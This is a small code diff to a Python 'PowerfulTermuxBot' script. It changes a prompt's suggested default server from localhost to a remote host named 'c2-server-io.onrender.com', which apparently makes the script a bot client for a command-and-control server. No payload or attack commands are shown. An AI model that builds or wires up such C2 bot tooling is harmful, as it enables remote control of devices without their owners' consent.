@@ -249,7 +249,7 @@ class PowerfulTermuxBot:
         print("    • http://localhost:5000")
         print("    • http://192.168.1.100:5000")
         print("    • http://your-server.com:5000")
-        print("    Or press ENTER for default (http://localhost:5000)")
+        print("    Or press ENTER for default (https://c2-server-io.onrender.com)")
         url = input("\n\033[1;36m>>>\033[0m ").strip()
         
         if not url:
@@ -837,3 +837,4 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"\n[\033[1;31m!\033[0m] Fatal error: {e}")
         sys.exit(1)
+
